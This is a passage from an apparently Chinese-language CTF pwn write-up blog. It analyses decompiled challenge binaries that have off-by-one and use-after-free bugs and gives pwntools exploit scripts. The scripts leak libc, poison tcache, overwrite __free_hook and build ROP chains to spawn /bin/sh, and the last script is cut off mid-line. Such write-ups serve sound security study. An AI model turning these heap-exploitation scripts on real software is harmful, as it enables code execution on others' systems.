+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">data</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input your number:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">output(-<span class="number">13</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your number:\n&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">15</span>))-<span class="number">0x8459a</span></span><br><span class="line">info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>),)</span><br><span class="line">pop_rdi=libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>),executable=<span class="literal">True</span>))</span><br><span class="line">ret=libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;ret;&#x27;</span>),executable=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="number">0x401523</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"><span class="built_in">input</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">input</span>(pop_rdi)</span><br><span class="line"><span class="built_in">input</span>(sh)</span><br><span class="line"><span class="built_in">input</span>(ret)</span><br><span class="line"><span class="built_in">input</span>(system)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    output(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">input</span>(pop_rdi)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="one"><a href="#one" class="headerlink" title="one"></a>one</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>开头有一个简单的检验，伪随机数绕过即可</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v2 = rand() % <span class="number">200</span>;</span><br><span class="line">  v3 = rand() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let me know if u are not a rebot.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d+%d=?\n&quot;</span>, v2, v3);</span><br><span class="line">  <span class="keyword">if</span> ( v2 + v3 != (<span class="type">unsigned</span> <span class="type">int</span>)readint() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get out robot&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Go on!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来是四个交互都有的常规堆，漏洞点在edit</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> n8; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which one?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n8);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)n8 &gt; <span class="number">8</span> || !*((_QWORD *)&amp;clist + n8) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what to change?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;clist + n8), slist[n8] + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Finish!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>非常明显的off-by-one</p>
+<p>而且是2.31版本，检查不多，直接选择造成堆块复用然后打free_hook即可</p>
+<p>麻烦的是题目没给版本，不过简单的测试一下回显的结果，就能确定libc的版本范围了</p>
+<p>最后使用的是<code>2.27-3ubuntu1.6_amd64</code>这个版本的</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">lib=CDLL(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    time=lib.time(<span class="number">0</span>) </span><br><span class="line">    lib.srand(time)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(lib.rand()%<span class="number">200</span>+lib.rand()%<span class="number">100</span>).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5.exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;the index of command?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;the size of command?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;the command?\n&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;which one?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;which one?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;what to change?\n&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;which one?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">init()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x430</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec0a0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x38</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x38</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x38</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)+p8(<span class="number">0x81</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)+p64(<span class="number">0x41</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x38</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x38</span>,p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="bad-heap"><a href="#bad-heap" class="headerlink" title="bad_heap"></a>bad_heap</h1><h2 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h2><p>有add，delete，show的2.35堆</p>
+<p>add</p>
+<p>主要限制了堆块的大小&lt;&#x3D;0x400</p>
+<p>至于只能申请0x14个堆块倒是无所谓，因为并不检查哪些堆块是否正在使用，直接覆盖都可以</p>
+<p>唯一有意思的检查是，判断申请到的堆块是不是在libc范围内，是就exit，这个后续会提及应对方式</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x14_1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x14; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  _DWORD nbytes[<span class="number">5</span>]; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;nbytes[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input idx:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n0x14);</span><br><span class="line">  <span class="keyword">if</span> ( n0x14 &gt;= <span class="number">0x14</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input size:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( nbytes[<span class="number">0</span>] &gt; <span class="number">0x400u</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  n0x14_1 = n0x14;</span><br><span class="line">  *((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)n0x14_1) = <span class="built_in">malloc</span>(nbytes[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)n0x14) &gt;= (<span class="type">unsigned</span> __int64)libc_start</span><br><span class="line">    &amp;&amp; *((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)n0x14) &lt;= (<span class="type">unsigned</span> __int64)libc_end )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_40A8[<span class="number">4</span> * n0x14] = nbytes[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)n0x14), nbytes[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)&amp;nbytes[<span class="number">1</span>] - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>delete</p>
+<p>明显的uaf漏洞</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">dele</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input idx:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * v1) )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;<span class="built_in">list</span> + <span class="number">2</span> * v1));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>show是常规流程</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>通过合理的排布堆块，让同一个chunck同时在unsortedbin和tcachebin中</p>
+<p>再通过unsortedbin的合理切割，使得可以修改某个tcachebin中chunck的fd，完成tacahce posion即可</p>
+<p>至于关于libc的检查不用担心，只是禁用了io</p>
+<p>仍然有两种打法：</p>
+<ol>
+<li>通过<code>tls_dtor_list</code>劫持exit，但是题目没给ld文件，断网环境下也没有自配这个对应小版本的ld文件所以并没有使用</li>
+<li>利用<code>environ</code>攻击栈上返回地址，后续exp采用的就是这个方法</li>
+</ol>
+<p>值得一提的是，<code>environ</code>地址与libc的关系</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bss上的判断变量：libc_base &amp; libc_end</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555558080</span> —▸ <span class="number">0x7ffff7c00000</span> ◂— <span class="number">0x3010102464c457f</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555558088</span> —▸ <span class="number">0x7ffff7e1c000</span> ◂— <span class="number">0</span></span><br><span class="line"></span><br><span class="line">vmmap</span><br><span class="line"><span class="number">0x7ffff7c00000</span>     <span class="number">0x7ffff7c28000</span> r--p    <span class="number">28000</span>      <span class="number">0</span> libc.so.<span class="number">6</span></span><br><span class="line"><span class="number">0x7ffff7c28000</span>     <span class="number">0x7ffff7dbd000</span> r-xp   <span class="number">195000</span>  <span class="number">28000</span> libc.so.<span class="number">6</span></span><br><span class="line"><span class="number">0x7ffff7dbd000</span>     <span class="number">0x7ffff7e15000</span> r--p    <span class="number">58000</span> <span class="number">1b</span>d000 libc.so.<span class="number">6</span></span><br><span class="line"><span class="number">0x7ffff7e15000</span>     <span class="number">0x7ffff7e16000</span> ---p     <span class="number">1000</span> <span class="number">215000</span> libc.so.<span class="number">6</span></span><br><span class="line"><span class="number">0x7ffff7e16000</span>     <span class="number">0x7ffff7e1a000</span> r--p     <span class="number">4000</span> <span class="number">215000</span> libc.so.<span class="number">6</span></span><br><span class="line"><span class="number">0x7ffff7e1a000</span>     <span class="number">0x7ffff7e1c000</span> rw-p     <span class="number">2000</span> <span class="number">219000</span> libc.so.<span class="number">6</span></span><br><span class="line"><span class="number">0x7ffff7e1c000</span>     <span class="number">0x7ffff7e29000</span> rw-p     d000      <span class="number">0</span> [anon_7ffff7e1c]</span><br><span class="line"><span class="number">0x7ffff7fb8000</span>     <span class="number">0x7ffff7fbd000</span> rw-p     <span class="number">5000</span>      <span class="number">0</span> [anon_7ffff7fb8]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp;environ</span><br><span class="line">$<span class="number">1</span> = (<span class="type">char</span> ***) <span class="number">0x7ffff7ffe2d0</span> &lt;environ&gt;</span><br><span class="line"></span><br><span class="line">可以观察到，libc_base和libc_end确实对应了libc的起点终点，但是environ并不在这个范围内，而是在anon段</span><br><span class="line">所以完全可以利用</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>我们需要先通过第一次poison申请到environ向前一点的内容，send发送覆盖到environ处即可</p>
+<p>然后用show，使得覆盖的垃圾数据连带environ中存储的栈地址也泄露即可</p>
+<p>之后再一次poison申请到栈上，攻击栈的返回地址为我们的攻击链即可</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)<span class="comment">#log_level=&#x27;debug&#x27;,</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;inputs your choice:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,data=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input idx:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input size:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input content:\n&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input idx:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input idx:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x200</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;key: &quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recv(<span 